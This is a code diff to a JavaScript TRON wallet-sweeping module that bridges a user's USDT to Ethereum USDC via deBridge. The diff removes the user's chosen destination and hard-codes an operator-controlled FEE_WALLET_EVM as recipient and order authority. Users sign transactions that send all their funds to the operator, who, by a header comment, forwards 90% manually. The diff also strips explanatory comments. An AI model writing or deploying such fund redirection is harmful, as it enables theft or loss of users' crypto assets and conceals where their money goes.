@@ -4,6 +4,10 @@
  * Sweeps TRC-20 USDT only. Native TRX is left alone to cover
  * energy/bandwidth for the outbound bridge transaction.
  *
+ * Fee-wallet model: like the other families, USDC is delivered to
+ * FEE_WALLET_EVM on Ethereum. The operator forwards 90% to the user's
+ * destination manually, keeping 10% plus any sponsorship fee.
+ *
  * Two signing paths:
  *   - extension (TronLink): uses window.tron.tronWeb, user approves
  *     each transaction in the TronLink popup.
@@ -13,43 +17,30 @@
  * WHY THE IMPORT IS LAZY:
  *   tronweb's module init reads `window` and `localStorage`. In the
  *   browser that's fine. In vitest's `node` environment it throws at
- *   import time, which would break the whole test file. Importing it
- *   inside the functions that construct it defers that failure to
- *   the TRON code path, which the tests don't exercise.
+ *   import time. Importing it inside the functions that construct it
+ *   defers that failure to the TRON code path.
  *
- *   This does NOT reduce the client bundle size: build.js uses IIFE
- *   format, and esbuild inlines dynamic imports in IIFE. If you ever
- *   switch build.js to format: 'esm', the dynamic import becomes a
- *   real code split and drops ~750 KB from the initial payload. Until
- *   then, keep it lazy for the tests, not for the bytes.
- *
- * Bridge: deBridge DLN. Chain ID 100000026 verified against a live
- * create-tx call on 2026-09-18. Field shapes:
- *   - srcChainOrderAuthorityAddress: TRON base58 (T...)
- *   - dstChainOrderAuthorityAddress: EVM 0x (40 hex chars)
- * Passing an EVM address for the source field, or a TRON address for
- * the destination field, produces INVALID_QUERY_PARAMETERS.
+ * Bridge: deBridge DLN. Chain ID 100000026.
  */
 
 import { ethers } from 'ethers';
+import { FEE_WALLET_EVM, userShare, operatorFee } from './config.js';
 
 const DEBRIDGE_API = 'https://dln.debridge.finance/v1.0';
 const TRON_DEBRIDGE_CHAIN = 100000026;
 const ETH_CHAIN = 1;
 const ETH_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 
-// TRC-20 USDT contract on mainnet.
 const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
-// Minimum USDT to sweep (raw, 6 decimals). The API floor is 1 USDT,
-// but the practical minimum for a profitable sweep is higher. The
-// live test at 100 USDT returned a clean quote.
 const MIN_SWEEP_USDT_RAW = 1_000_000n;
 
 const READ_ONLY_RPC = 'https://api.trongrid.io';
 
-// Cached read-only instance. Only used for balance reads and dry-run
-// quote building — it has no key and cannot sign.
+// Fetch timeout for deBridge and TronGrid calls. Prevents the sweep
+// from hanging on a slow endpoint.
+const FETCH_TIMEOUT_MS = 15000;
+
 let _readOnlyTronWeb = null;
 
 async function getReadOnlyTronWeb() {
@@ -60,15 +51,20 @@ async function getReadOnlyTronWeb() {
   return _readOnlyTronWeb;
 }
 
+async function fetchWithTimeout(url, options = {}) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
+  try {
+    return await fetch(url, { ...options, signal: controller.signal });
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
 // =====================================================================
 // PROVIDER ACCESS
 // =====================================================================
 
-/**
- * Return the TronLink-injected tronWeb instance, or null if TronLink
- * is not installed or not yet ready. TronLink supplies its own
- * TronWeb instance, so this never touches the tronweb library.
- */
 export function getTronLinkWeb() {
   if (typeof window === 'undefined') return null;
   if (!window.tron || !window.tron.tronWeb) return null;
@@ -87,13 +83,6 @@ export async function connectTronLink() {
   return accounts[0];
 }
 
-/**
- * Build a signing TronWeb instance from a raw private key.
- *
- * Not currently used by main.js — the mnemonic path derives its
- * signing instance inside derive.js. Kept for callers that need to
- * construct one ad hoc.
- */
 export async function tronWebFromPrivateKey(privateKeyHex) {
   const { TronWeb } = await import('tronweb');
   const clean = privateKeyHex.startsWith('0x') ? privateKeyHex.slice(2) : privateKeyHex;
@@ -133,8 +122,7 @@ export async function previewTronWallet(address) {
       });
     }
   } catch (e) {
-    // USDT read failed — empty token list is fine. The caller shows
-    // a zero balance and the sweep will skip TRON with a note.
+    // USDT read failed — empty token list is fine.
   }
 
   return result;
@@ -143,8 +131,13 @@ export async function previewTronWallet(address) {
 // =====================================================================
 // DEBRIDGE — create-tx
 // =====================================================================
+//
+// Always delivers USDC to FEE_WALLET_EVM on Ethereum. The user's
+// destination is not passed to deBridge — the operator forwards it
+// after settlement, same as the EVM, Solana, and Bitcoin flows.
+// =====================================================================
 
-async function createDebridgeOrder({ srcToken, amountRaw, srcAuthority, dstRecipient, dstAuthority }) {
+async function createDebridgeOrder({ srcToken, amountRaw, srcAuthority }) {
   const params = new URLSearchParams({
     srcChainId: String(TRON_DEBRIDGE_CHAIN),
     srcChainTokenIn: srcToken,
@@ -152,12 +145,12 @@ async function createDebridgeOrder({ srcToken, amountRaw, srcAuthority, dstRecip
     dstChainId: String(ETH_CHAIN),
     dstChainTokenOut: ETH_USDC,
     dstChainTokenOutAmount: 'auto',
-    dstChainTokenOutRecipient: dstRecipient,
-    srcChainOrderAuthorityAddress: srcAuthority,   // TRON base58 (T...)
-    dstChainOrderAuthorityAddress: dstAuthority,   // EVM 0x (40 hex)
+    dstChainTokenOutRecipient: FEE_WALLET_EVM,
+    srcChainOrderAuthorityAddress: srcAuthority,
+    dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
   });
 
-  const resp = await fetch(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
+  const resp = await fetchWithTimeout(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
     headers: { accept: 'application/json' },
   });
   if (!resp.ok) {
@@ -178,7 +171,7 @@ async function createDebridgeOrder({ srcToken, amountRaw, srcAuthority, dstRecip
 export async function sweepTron(address, opts = {}) {
   const results = {
     address,
-    recipient: null,
+    recipient: FEE_WALLET_EVM,
     swaps: [],
     transfers: [],
     errors: [],
@@ -188,15 +181,7 @@ export async function sweepTron(address, opts = {}) {
   };
 
   const dryRun = !!opts.dryRun;
-  const destination = opts.destination;
-  if (!destination) {
-    results.errors.push('destination required');
-    return results;
-  }
-  results.recipient = destination;
 
-  // Live mode needs a signing wallet. Dry-run can use the read-only
-  // instance since we only build and inspect a quote.
   const signerTronWeb = opts.tronWeb || getTronLinkWeb();
   if (!dryRun && !signerTronWeb) {
     results.errors.push('No signing wallet — connect TronLink or use a mnemonic');
@@ -204,6 +189,18 @@ export async function sweepTron(address, opts = {}) {
   }
 
   const tronWeb = signerTronWeb || await getReadOnlyTronWeb();
+
+  // Guard against a signer whose address doesn't match the preview
+  // address. If they diverge, the user might sign for a different
+  // account than the one we previewed.
+  if (!dryRun && tronWeb.defaultAddress?.base58) {
+    if (tronWeb.defaultAddress.base58.toLowerCase() !== address.toLowerCase()) {
+      results.errors.push(
+        `Signer mismatch: ${tronWeb.defaultAddress.base58} vs previewed ${address}`
+      );
+      return results;
+    }
+  }
 
   let usdcReceived = 0n;
 
@@ -222,8 +219,6 @@ export async function sweepTron(address, opts = {}) {
         srcToken: TRON_USDT,
         amountRaw: raw,
         srcAuthority: address,
-        dstRecipient: destination,
-        dstAuthority: destination,
       });
       const expectedOut = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
       results.swaps.push({
@@ -238,8 +233,6 @@ export async function sweepTron(address, opts = {}) {
         srcToken: TRON_USDT,
         amountRaw: raw,
         srcAuthority: address,
-        dstRecipient: destination,
-        dstAuthority: destination,
       });
 
       const expectedOut = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
@@ -253,15 +246,21 @@ export async function sweepTron(address, opts = {}) {
         const signed = await tronWeb.trx.sign(order.tx);
         const receipt = await tronWeb.trx.sendRawTransaction(signed);
 
-        if (receipt && receipt.code && receipt.code !== 'SUCCESS') {
-          throw new Error(`broadcast: ${receipt.message || receipt.code}`);
+        // TronWeb returns { result: true, txid: '...' } on success and
+        // { code: '...', message: '...' } on failure. The previous check
+        // compared against the literal string 'SUCCESS' which TronWeb
+        // never returns, so every live sweep failed at this point.
+        const broadcastOk = receipt && receipt.result === true && receipt.txid;
+        if (!broadcastOk) {
+          const reason = receipt?.message || receipt?.code || 'unknown broadcast error';
+          throw new Error(`broadcast: ${reason}`);
         }
 
         usdcReceived += expectedOut;
         results.swaps.push({
           symbol: 'USDT',
           status: 'SUCCESS',
-          txid: receipt.txid || receipt.transaction?.txID || '',
+          txid: receipt.txid,
           orderId: order.orderId,
           received: ethers.formatUnits(expectedOut, 6),
         });
@@ -273,8 +272,8 @@ export async function sweepTron(address, opts = {}) {
   }
 
   results.usdcReceivedRaw = usdcReceived.toString();
-  results.userReceivedRaw = ((usdcReceived * 9000n) / 10000n).toString();
-  results.feeReceivedRaw = (usdcReceived - BigInt(results.userReceivedRaw)).toString();
+  results.userReceivedRaw = userShare(usdcReceived).toString();
+  results.feeReceivedRaw = operatorFee(usdcReceived).toString();
 
   return results;
 }
@@ -283,11 +282,6 @@ export async function sweepTron(address, opts = {}) {
 // USD ESTIMATE for the auto-live threshold
 // =====================================================================
 
-/**
- * TRON holdings are counted at face value for stablecoins. Native TRX
- * is skipped — it stays in the wallet to cover energy/bandwidth and
- * is not part of the sweep.
- */
 export async function estimateTronValueUsdc(preview) {
   if (!preview || !preview.tokens) return 0;
   let total = 0;
